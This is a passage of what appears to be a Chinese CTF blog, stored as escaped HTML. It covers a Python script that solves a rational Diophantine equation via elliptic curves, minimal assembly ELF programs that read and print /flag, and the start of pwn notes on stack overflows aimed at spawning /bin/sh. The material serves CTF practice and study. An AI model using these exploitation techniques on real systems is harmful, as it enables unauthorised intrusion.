可以发现这篇文章的思路说的很清楚<br><a href=\"https://www.agftutoring.com/x-yz-y-xz-z-xy-4/\">https://www.agftutoring.com/x-yz-y-xz-z-xy-4/</a></p>\n<p>从文章中提到的论文找到准确的公式<br><a href=\"http://publikacio.uni-eszterhazy.hu/2858/1/AMI_43_from29to41.pdf\">http://publikacio.uni-eszterhazy.hu/2858/1/AMI_43_from29to41.pdf</a><br>然后自己手写一下脚本 根据公式算结果 加入4096bit的约束</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">from</span> fractions <span class=\"keyword\">import</span> Fraction</span><br><span class=\"line\"><span class=\"keyword\">from</span> math <span class=\"keyword\">import</span> log</span><br><span class=\"line\">N = <span class=\"number\">14</span></span><br><span class=\"line\"></span><br><span class=\"line\">a = Fraction(<span class=\"number\">4</span>*N**<span class=\"number\">2</span>+<span class=\"number\">12</span>*N-<span class=\"number\">3</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">b = Fraction(<span class=\"number\">32</span>*(N+<span class=\"number\">3</span>),<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">aa = b-Fraction(<span class=\"number\">1</span>,<span class=\"number\">3</span>)*a**<span class=\"number\">2</span></span><br><span class=\"line\">bb = Fraction(<span class=\"number\">2</span>,<span class=\"number\">27</span>)*a**<span class=\"number\">3</span>-a*b/<span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"comment\">#print(aa,bb)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">equ</span>(<span class=\"params\">a,b,c</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a/(b+c)+b/(a+c)+c/(a+b)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">lcm_3</span>(<span class=\"params\">a,b,c</span>):</span><br><span class=\"line\">    lcm_ab = (a*b)//gmpy2.gcd(a,b)</span><br><span class=\"line\">    <span class=\"comment\">#return a*b*c</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> lcm_ab*c // gmpy2.gcd(lcm_ab,c)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">geta</span>(<span class=\"params\">x,y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"number\">8</span>*(N+<span class=\"number\">3</span>)-x+y)/(<span class=\"number\">2</span>*(<span class=\"number\">4</span>-x)*(N+<span class=\"number\">3</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getb</span>(<span class=\"params\">x,y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"number\">8</span>*(N+<span class=\"number\">3</span>)-x-y)/(<span class=\"number\">2</span>*(<span class=\"number\">4</span>-x)*(N+<span class=\"number\">3</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getc</span>(<span class=\"params\">x,y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ((-<span class=\"number\">4</span>)*(N+<span class=\"number\">3</span>)-(N+<span class=\"number\">2</span>)*x)/((<span class=\"number\">4</span>-x)*(N+<span class=\"number\">3</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">a,b,c</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> equ(a,b,c)== N</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a &gt; <span class=\"number\">0</span> <span class=\"keyword\">and</span> b &gt; <span class=\"number\">0</span> <span class=\"keyword\">and</span> c &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"comment\">#print(a,b,c)</span></span><br><span class=\"line\">        da,db,dc = a.denominator,b.denominator,c.denominator</span><br><span class=\"line\">        lcm = lcm_3(da,db,dc)</span><br><span class=\"line\">        <span class=\"comment\">#print(lcm)</span></span><br><span class=\"line\">        lcm = Fraction(<span class=\"built_in\">int</span>(lcm),<span class=\"number\">1</span>)</span><br><span class=\"line\">        aa,bb,cc = a.numerator*lcm//a.denominator,b.numerator*lcm//b.denominator,c.numerator*lcm//c.denominator</span><br><span class=\"line\">        <span class=\"keyword\">if</span> log(aa,<span class=\"number\">10</span>) &gt;<span class=\"number\">4096</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;a=<span class=\"subst\">&#123;aa&#125;</span>\\nb=<span class=\"subst\">&#123;bb&#125;</span>\\nc=<span class=\"subst\">&#123;cc&#125;</span>&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(equ(aa,bb,cc))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"comment\">#print(a/(b+c)+b/(a+c)+c/(a+b),N)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ff</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x**<span class=\"number\">3</span> + aa*x + bb</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">xp,yp,xq,yq</span>):</span><br><span class=\"line\">    <span class=\"comment\">#xp += a/3</span></span><br><span class=\"line\">    <span class=\"comment\">#xq += a/3</span></span><br><span class=\"line\">    <span class=\"comment\">#print(yp**2,ff(xp))</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> xp == xq <span class=\"keyword\">and</span> yq == yp:</span><br><span class=\"line\">        lm = (<span class=\"number\">3</span>*xp**<span class=\"number\">2</span>+aa)/(<span class=\"number\">2</span>*yp)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        lm = (yp-yq)/(xp-xq)</span><br><span class=\"line\">    xr = lm**<span class=\"number\">2</span>-xp-xq</span><br><span class=\"line\">    yr = lm*(xp-xr)-yp</span><br><span class=\"line\">    <span class=\"comment\">#print(yr**2,ff(xr),f(xr-a/3))</span></span><br><span class=\"line\">    <span class=\"comment\">#print(type(xr))</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> xr,yr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">f</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x**<span class=\"number\">3</span> + a*x**<span class=\"number\">2</span>+b*x</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">x,y</span>):</span><br><span class=\"line\">    x = Fraction(<span class=\"built_in\">int</span>(x),<span class=\"number\">1</span>)</span><br><span class=\"line\">    y = Fraction(<span class=\"built_in\">int</span>(y),<span class=\"number\">1</span>)</span><br><span class=\"line\">    x += a/<span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"comment\">#print(check(geta(x,y),getb(x,y),getc(x,y)))</span></span><br><span class=\"line\">    xr,yr = add(x,y,x,y)</span><br><span class=\"line\">    check(geta(xr-a/<span class=\"number\">3</span>,yr),getb(xr-a/<span class=\"number\">3</span>,yr),getc(xr-a/<span class=\"number\">3</span>,yr))</span><br><span class=\"line\">    <span class=\"comment\">#print(xr-a/3,yr)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">        xrr,yrr = add(x,y,xr,yr)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> check(geta(xrr-a/<span class=\"number\">3</span>,yrr),getb(xrr-a/<span class=\"number\">3</span>,yrr),getc(xrr-a/<span class=\"number\">3</span>,yrr)):</span><br><span class=\"line\">            <span class=\"comment\">#break</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"comment\">#x,y = xr,yr</span></span><br><span class=\"line\">        xr,yr = xrr,yrr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">20000</span>,<span class=\"number\">20000</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    fx = f(x)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> fx &lt;<span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    y,flag = gmpy2.iroot(<span class=\"built_in\">int</span>(fx),<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(x,y)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#solve(x,y)</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> solve(x,y):</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"comment\">#break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure>\n<p>结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">N=2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-100 260</span><br><span class=\"line\">N=4</span><br><span class=\"line\">a=154476802108746166441951315019919837485664325669565431700026634898253202035277999</span><br><span class=\"line\">b=36875131794129999827197811565225474825492979968971970996283137471637224634055579</span><br><span class=\"line\">c=4373612677928697257861252602371390152816537558161613618621437993378423467772036</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-200 680</span><br><span class=\"line\">N=6</span><br><span class=\"line\">a=20260869859883222379931520298326390700152988332214525711323500132179943287700005601210288797153868533207131302477269470450828233936557</span><br><span class=\"line\">b=2250324022012683866886426461942494811141200084921223218461967377588564477616220767789632257358521952443049813799712386367623925971447</span><br><span class=\"line\">c=1218343242702905855792264237868803223073090298310121297526752830558323845503910071851999217959704024280699759290559009162035102974023</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">N = 10</span><br><span class=\"line\">a=269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977</span><br><span class=\"line\">b=4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209</span><br><span class=\"line\">c=221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">N = 12</span><br><span class=\"line\">a=9771648423124723726177348367579036940996321519493182113688185913291912152167430962940286713704689291955030766917703582615167560632692208569350596318361971945750539077074921376878141735974825044184065325295542414690299404543957471585986271492883344336895444628417764598798059282135540264079530839334683089479387712689664348829803188436456581110658900633423526039703131197080466706425129542338489808063522607588342584200312382147588021744331992391832435570655076979943362024164159108464336717094994098309362464023676446199308737155163873551701208488828402974721390557367029987977855707022545910750122799634001172374761109175036019323234546383998982432217361050210984517599581577248801341849448303544088176264625811806142770294209982442408662519374761728070223714521821341117002331986498770555184073085027058095297336167677439607364510657437509486347967307803660171207058735567136463940112222314297317750700776624058908857471453427988612985064899673716630236456014245800912222319599696269373722466085725674157804399937147349826725426492477399825189629059858143754233366556058143229760327782450544023555022700607812759157576200327040510464661565706996737315846564795178593069240330781574428355212732623725876985598328229189126427627014915844367895005634186488060123351425224254658993594181034585580728472926584634345281045130880900933874051988840549119158099281094622771545146573280290125472471508524146960616613046094502775760354004277755376103461683156447272164405834240309654181339266066263159088013664792412947782580562302145769970189263032100245853943329981223091010635294626858575635181685165656502546698206083122664124915608202069269724379843842840589157695219270750118704026028654165401285548616906593019632882729540612247917655897119373938582993296569576361174642805599263009865424731023686421547614323517551093776435182182140089430393766501364362547924371223967349402455455441526984962551991999740939806598094829176294395288025415862487224690038784444479146323714873578973543339383804639812551447024169760867016277652364254017342569664821765700133711906605529500370028326735684760029880824589496327934929890451806466028722732111707352281105526352585578795270682734602251672860466286137618451728577222436372703708755203706276857915607877115578246058172188790243120058005406354006933249427269186026037719060025838643524816124535097800306551506659235785757708355416892809830706818987658005883960242994520660422766140515613930376253008301505691252247843497900812092131062228821968787255843774769294070526791658638255579065403517667805443531566516803268415382062088531458623037511041673490301151134361350520723131052983435925526212885827536368956540475248756348725668932765463359607076032536135984411047176832817954294834358117678876487728677844675188893304999714929142496108422125998795771469689592410179339895441001807800777244298595113076411858026767080234245436677391556512837521159681035996524381164562299217240816526864051747417996965408494564793876350006434149310494879345252225512207327377641046172449349234814800370542810062964918653675533999879633796275182294288725302482565574689774236243367061493493871378478841132541150327804822340923534374347417734327962641422485698737250906970866594251938717273245180046336357159717643987207108520200884860052166562771159345328326046425986193537383085182662821369601389344051970598825589841391881179369502441</span><br><span class=\"line\">b=355278342530640706599407170519248057086229224524520519157141107708508537777205114284836515916647281859247795539514644616851559754279314555875406812187972064036035557571299859907280810487149605334993350531002451299724364967645584709273394386591591195780391447196683330849598560271745701404034625131501993929419554266148290436679685445363131010836932629342154128643351678951282983749890989559890172019099261175094354121592456388228285392695032585171051639572467407610797751366649496928321845783437550911111047278383580607079737332894364303410021661677697214580427323420620970187098111338585040445789178378027622721085136875173221486668228434792389270646253382261057411216813326434321501013051997430441500004490156606094833372922100067917450173462555720881102457821630342749340867365008072441643478548721857292917452800697091436767776083635027373005756786010659444917124676112164411021940883874460477540417603487387574930026382803252605451761123854779624051422486933911811669680548762039750465949397184413613720601642705976126017892620552601501858263828583840887458987486197543156013041348847816031608699049912936308450819095510369701575578097250363368454461945148450576088433249713999167088458370351492130049783151127247370858531196993379176146118278989362781036431924069823925694605248692612491891011456236063305446307145213155963155713254947146969705707871047748827652962063454148762245165952045524839856938394353277318602286742502902467957014204949461972627441403014827123154496446151973383417479788921710173738381531711188367127686337683922337834803729129860547622394303860359090631322192199105383221995196638722101561512713080014557011603612235554087760232042126289412640004429367002342732510653670491385158696739998435013535332649487741680965013588417081164473304832663472222330032194673510586568514566505918964524054367862236706513657705601280209392824784214794388906944781256335282029618881491665550233021568492161644797572375050841378822048811169837099457416172794125347941123267556933505091898801954097367551330470039516528938002060368203771887848789933865049084996127893937024390453874088559156599250770154698773410485652163460604146736536998704744308747694562472589990594315082773213352567913224257883617970694009815571365310386133474806148114386493590025948707911857605911663465773207882473351193724108758290123955278061608587631862670149052118711701158527145181175190875795882098138836322507020482823700475885261298942438375141523097467136949344549146226783627312473680145737634678721649048185277680609630836890634565927029420985039606240188037856013124138575514784612402632326680678385133078122001191529488632864949389691396850211361741599166067293474086420940368406413602811300967477515893863371822747402011882565685406820752393426871334343726588669248706316761007252201944198166289444499842118193477939440518068080562630698421649307162223651191249634030063115515307507458592025473811290000412080019218175657190077848458901960552364736984977562980489155298839168694740209782414540433384032643432411675316990421342815443209738155863833108803588186058559389830125622362622871909735505714741871915567556115574951697169999420730845094742737430840794283524289288407229358051139188774198818399680388413331802255608133294263528032850298389448639132253320503425433048688168649080671114897526452528795785075258192344501895197396313877737618743144143311361</span><br><span class=\"line\">c=20035885316890023606830534495067252147691357652057772449634307305904187410990992558920956548259424273157355393196003732013539899362716100216100574234193461987992270496600195300035752479460516954902069442618504792465804770124967301970678978328799586707754521255514483172028191260188475400317446571436004845998985653096037624624322281748829779447176083968674969833631184023187122343557933419142060815193896987871898527455938239633288396733679352394480370944272017028820473119804801589995735129329783435030364346676954726243545810431065584725705747425285116415098270756170854793527738400748018356825870940359453012877584220232457239486868961160286561107075730870191541707907024801190678872428378869070743156118725466561031241711673504710114636631852382374234153002593815839905362438349777252361649553219532495089010852188819251924513393843140092077472310502164724666534953510429204661960760251076825195012089967164704751956545716713621200138891509373146662781427659132869096244223556723315169600948861332954354413695888139017122816338494980502776971525437417811441688700350703763215954037112632057856459110596088774179908693660103919027798842365141387313347532358053282282310316931481842456257180432996840651935591189065259608213860227670186727338535935419000104738195984938003074607151510868080842855420074387493775652849570582238533035000592730676469385254313682643506004770455623730437382781957476292884741268313376108166969374162736157947254538709529590451732215030394607575401311261495611074569827532998121985392068544149777898463913810868539866423391561166029673154931578514570213744634449182859448121221325492409874400969111705041715153435314453329592896445669394904690642194906508672813178927078506631317053598793270180912538514259578229993791104172792725314850021809824960706011811171135997354162296978832638498179879771698379520095937384178635037528330099466818183983444951307338720807542182935366038924920803039824818978210615772435040781173000522957795318935743355256682046477991218402526418808672933986788522397056643264167847014634860127505194733579174334258294520958784673856708467904118326279768028815946419189313676293061904510582604099208908846437914476479234000943244508656493406134426802932798305615095458701786048985034479492729357877345432656822502309506336155060754833509042934673647393543153071076853125875966535409760468353908956772073598404677550786987821584368329022155627837041395034568285609452470732829555582976579267394284928019500640977457130634550711478008433495429299640611555109171351069880574540503991840730805473241840138226375586949924647467718787261507459412537764703036454930376493490948212829487213980710738206430842478425877099783023977823272528573428967147461248519564018755183647327105058234798276539268716600710944282509505534186050000996976904596307571400703851012188753774844974808960378596634959429569386969879801494409815032125990390725960817685563429841025885365323217522340255134111238995153536146711806678993879340908664992009441435660169161976982012130533343179316942599654407053716666680671913105456952462060978938905812334117338345608406493320504708189703699696962739031333121998774598083769292025442530856763493460673394201872178090312059357744194235029914560026838488336959743500520432584396018821068625402593286299143852751101612713576613521611747957521749921921568265523624185276246164078350540463107124</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">N=14</span><br><span class=\"line\">a=87005542023454150524855541144750166180919865766930052623463014576174554467821213957706498855559077927873140148579022102984237075640747995279989642832992188016154244525422278966269291094999255638208855482151405506938548578978626993952306016946318459909590778342355856153147577472731880392922408448351120608836436787309376542102861246758131059387213726386714147750943829877803608813501157597297132278662569590484844550173720257728957567960401433605097886634959342671140099728318480661981670113406848719025661715441498240565928452257694284734033186800579565313362313891643040303824890693074326810596828204114920499564539002024387811501676993037142024700539208458234538805837480373101259087885435757318639663667261597412600756998748849468402910307204633942748903285652463107201618869806410335014875125086076219328243935905232512517288787677039607942380387101187256890064827850683397174701574071447859273840130243421585240230546720814792141872637351043465819000677767263935304511294609746934407215686517293774009054989655225608925542221677606386577019926666519641600364567557194208313131276771325487167689236642467808540431881464601888142548664563650077494805488093052836193825650435423280004797008818023441669902387920463908641771270053841646139610358473027295405503333253535988771195991171826325976224803312343154770764448787106871066190163308337503496520787439022463066715315188820932966437067264819835942543744914754708785528560264636221600739219290648079243002368855133337672334702546690962019521762114649491890011821844552982141986770779324959379319663450035429876647739511502891515857175267046923938895240190738331037400875186816754190488884935451452912276673912555287036698557958114181944091831763987997170817657860587503942307866008409270543838849198648993460302655964709466390742236643982561028874558104072512842460862178322605890336695658154025228215730711703698453887</span><br><span class=\"line\">b=1709135102428266402521578879727820755289613552803360621456124607477236062710486518306973764485152792403836982447127607442256178602384138654630699081618087896504547452419077042758442686206419280715364719358444963157698332025374708249586554595335682851323392839386182223430638025377285183953532982335289152167960094778509135832533486573163055391161165455290050618906285941817273026009595891889257351919713796943557063702989409958711830323963904165120856027913035875447234054819209407636752170808481354455393229418385392070333249788177149805823305996401240529129269675319850189648765585143872927446631219018758183300260538575964857576326413621858004145085056968233978117291959507622980746386913195986770246828428505004660553304111935995749966702604925072694758649032383912238958853266784140206835764547417096028632172800108512761682168258638590405734443542959079348266711305636364545280494327703507925613838554455967641989345934135982107562442831339601728404946376557099963807693948972893157706474963068481053339310924790906172115918700323627413150856820444271874431985423216088592099275993135702445229813416554038919256687626967939077194814654296017340955433406979774456197892632603339550402577651543232076531854230456549500665301719274202267084848477851486963621280516840090062870783676271139503026167429223506897465592567885474737385462535970365299131640088862391408665388681336793214264999254388651074994672108064474559668817847730748402579997019473615639106089768908506811205164186682823067680169244405306578488165373356991213550493590509092039078377380748348705035457779199811755686614360447907451061901486558052283679831011812123254664108196829552904290039038174025870011733057320270633278578446021776430625193839865126802043272540967717004297030511020349356790240239389396001123955974292384351794841187054815564421183556415606663233835771297306290441383808134021392865157</span><br><span class=\"line\">c=35686662438826817213563656105539275101535697856185534149345343499844688924609645885022355135918404539985234360061600350189104933602381092051318547433998422974780849873203504443997848655625530623340371134341848128666616900144765579208079985990838064549216971926322724228681888830028303266068257138844044018255271435540077145919301591275738734597339459327150605278900738075092002974105991478458558870434061142265122382216368947373807069713709930176019498122168857679124768213308531786347567931187892878408434918309016688829685352835815066580725250947929501490665081644655994535671618967990757851510884824555077182679991403377524647154791971060789752020813552933450127083583289512848480063215680871789266871667712713169422322364887230502908301686924054210360219287364955960956032042950833997524453330328272059153308291883334074276913609077731735284223918404284292419020812011476995921011741346807748175931518235517265745772175162459312702479399232407706908845419443981643112692945551070592330727356541136923766994413647861488973051126611026148759432379003889674724917944805607605522248369290505402289434909292483537959789906318874307733003636212064338665528270372138914552950520981104343589517822223391222134534938052800801473344178058681643355234652680630054983022124146408518221588969589953072079556410755020859599503506797164705586073997208789455400263349566445512977221962882867406488146422316005409966253780701584170838345028112949069889795685718655327046530483250125959173355678292967658914005638877070834611505129167951369865542011417024870301563177370018869158755113622408743199140022326059195657852986370212647002055769249427919561331384755453850684244409515534188128908717886781958319756449082516858512445042864312213606923472603131125312862163489874095569215350848020642593339333668497345496027314732958586211664873526777590213207494911489341805851119668605552962767</span><br></pre></td></tr></table></figure>\n\n\n\n\n<h3 id=\"Tiny-ELF\"><a href=\"#Tiny-ELF\" class=\"headerlink\" title=\"Tiny ELF\"></a>Tiny ELF</h3><p>手写汇编 3个syscall 不过似乎32bit比64bit更剩空间一点<br><a href=\"https://www.ngui.cc/el/639055.html?action=onClick\">https://www.ngui.cc/el/639055.html?action=onClick</a><br>应该是下面这个 记不清了（下面有80bytes的版本）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.section .bss</span><br><span class=\"line\">.equ bufSIZE, 65535</span><br><span class=\"line\">.comm buf, bufSIZE</span><br><span class=\"line\"></span><br><span class=\"line\">.section .text</span><br><span class=\"line\">.LC0:</span><br><span class=\"line\">\t.string &quot;/flag&quot;</span><br><span class=\"line\">.globl _start</span><br><span class=\"line\"></span><br><span class=\"line\">_start:\tmovl $2,%eax</span><br><span class=\"line\">\tleaq\t.LC0(%rip),%rdi</span><br><span class=\"line\">\t//movq\t$0,%rsi</span><br><span class=\"line\">\tsyscall</span><br><span class=\"line\">\tmov \t%eax,%edi</span><br><span class=\"line\">\tleaq\t-80(%rsp),%rsi</span><br><span class=\"line\">\tmov \t$32,%dx</span><br><span class=\"line\">\txor \t%eax,%eax</span><br><span class=\"line\">\tsyscall</span><br><span class=\"line\">\tmovq    $1,%rdi</span><br><span class=\"line\">\tmov \t$1,%rax</span><br><span class=\"line\">\tsyscall</span><br><span class=\"line\"></span><br><span class=\"line\">mov $0x3c, %eax</span><br><span class=\"line\">mov $42, %edi</span><br><span class=\"line\">syscall</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"Teensy-ELF\"><a href=\"#Teensy-ELF\" class=\"headerlink\" title=\"Teensy ELF\"></a>Teensy ELF</h3><p><a href=\"https://www.cnblogs.com/huqingyu/archive/2005/03/08/114896.html\">https://www.cnblogs.com/huqingyu/archive/2005/03/08/114896.html</a><br>不太懂具体原因 详细看elf文件格式可能得花很多时间 这里直接参考文章作者修改版和原版的对比尝试构造<br>一些可以优化的地方：</p>\n<ul>\n<li>fd的0 1 2分别对应stdin stdout stderr 所以新开的文件fd一定是3 write的系统调用号也是3 省去一次赋值</li>\n<li>open不需要第三个参数 可以提前把write的第三个参数值传好</li>\n<li>寄存器默认是0 都不用设置</li>\n<li>mov常数占用字节太多 用xor清空加inc dec等指令</li>\n</ul>\n<p>最后正好80bytes</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">;nasm -f bin -o tiny4.out tiny4.asm</span><br><span class=\"line\">  BITS 32</span><br><span class=\"line\"></span><br><span class=\"line\">\t        org     0x00010000</span><br><span class=\"line\"></span><br><span class=\"line\">\t        db      0x7F, &quot;ELF&quot;             ; e_ident</span><br><span class=\"line\">\t        dd      1                                       ; p_type</span><br><span class=\"line\">\t        dd      0                                       ; p_offset</span><br><span class=\"line\">\t        dd      $$                                      ; p_vaddr</span><br><span class=\"line\">\t        dw      2                       ; e_type        ; p_paddr</span><br><span class=\"line\">\t        dw      3                       ; e_machine</span><br><span class=\"line\">\t        dd      _start                  ; e_version     ; p_filesz</span><br><span class=\"line\">\t        dd      _start                  ; e_entry       ; p_memsz</span><br><span class=\"line\">\t        dd      4                       ; e_phoff       ; p_flags</span><br><span class=\"line\"></span><br><span class=\"line\">  _start:</span><br><span class=\"line\">\t        mov ebx,esp</span><br><span class=\"line\">            mov dl,0x20</span><br><span class=\"line\">            ; xor     eax,eax</span><br><span class=\"line\">\t        ; xor     ecx,ecx   ; str len       ; e_flags</span><br><span class=\"line\">\t        mov     al, 5   ; sys_write(fd, addr, len) : ebx, ecx, edx</span><br><span class=\"line\">\t        jmp     _next   ; jump to next part of the code</span><br><span class=\"line\">\t        dw      0x33                      ; e_ehsize</span><br><span class=\"line\">\t        dw      0x20                      ; e_phentsize</span><br><span class=\"line\">\t        dw      1                         ; e_phnum</span><br><span class=\"line\">  _next:        </span><br><span class=\"line\">            mov [esp],DWORD &#x27;/fla&#x27;</span><br><span class=\"line\">            mov [esp+4], WORD 0x0067</span><br><span class=\"line\">            int     0x80    ; syscall         ; e_shentsize</span><br><span class=\"line\">            mov ebx,eax</span><br><span class=\"line\">            mov ecx,esp</span><br><span class=\"line\">            ; mov edx,0x20</span><br><span class=\"line\">\t\t\tint 0x80</span><br><span class=\"line\">\t\t\tmov     al, 4</span><br><span class=\"line\">            dec ebx</span><br><span class=\"line\">            dec ebx</span><br><span class=\"line\">\t\t\tint 0x80</span><br><span class=\"line\"></span><br><span class=\"line\">            mov bl,42</span><br><span class=\"line\">\t        mov     al, 1   ; eax=1,sys_exit  ; e_shnum</span><br><span class=\"line\">\t        int     0x80    ; syscall         ; e_shstrndx</span><br><span class=\"line\"></span><br><span class=\"line\">  filesize      equ     $ - $$</span><br></pre></td></tr></table></figure>\n","categories":["ctf"]},{"title":"pwn","url":"/2024/01/22/ctf/pwn/","content":"<h1 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h1><p>对方给你远程执行一个程序 你需要控制对方计算机</p>\n<ol>\n<li>发现漏洞 更改控制流</li>\n<li>找执行system(“&#x2F;bin&#x2F;sh”)的方式</li>\n</ol>\n<ul>\n<li>file 看文件类型 32还是64</li>\n<li>用ida看反编译</li>\n<li>checksec 看保护</li>\n<li>objdump -d file &gt; asm.txt 看汇编</li>\n</ul>\n<h2 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h2><p><a href=\"https://github.com/skysider/pwndocker\">skysider&#x2F;pwndocker: A docker environment for pwn in ctf (github.com)</a></p>\n<p>gdb pwntools</p>\n<p>如果运行二进制报libc版本的错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>添加高版本的源</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">deb http://th.archive.ubuntu.com/ubuntu jammy main    #添加该行到文件</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>运行升级</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install libc6</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"栈溢出-stackoverflow\"><a href=\"#栈溢出-stackoverflow\" class=\"headerlink\" title=\"栈溢出(stackoverflow)\"></a>栈溢出(stackoverflow)</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> s[size];</span><br><span class=\"line\">gets(s);</span><br></pre></td></tr></table></figure>\n\n<p>gets不限制长度 read长度不匹配</p>\n<p>汇编</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">push ebp</span><br><span class=\"line\">mov esp,ebp</span><br><span class=\"line\">sub esp,size</span><br><span class=\"line\">...</span><br><span class=\"line\">call gets</span><br><span class=\"line\">add esp,size</span><br><span class=\"line\">...</span><br><span class=\"line\">leave  (mov ebp,esp  /  pop ebp)</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n\n<p>32位：覆盖size+4</p>\n<ul>\n<li><p>system(‘bin&#x2F;sh’) 或 execve(‘bin&#x2F;sh’,0,0) 都可以  </p>\n</li>\n<li><p>system有时候要求栈16地址对齐  但有时候满足了还是会出错</p>\n</li>\n<li><p>execve二 三个参数不设置可能也可以 （看运气）</p>\n</li>\n<li><p>本地调试的环境和libc会和远程有差异</p>\n</li>\n</ul>\n<h3 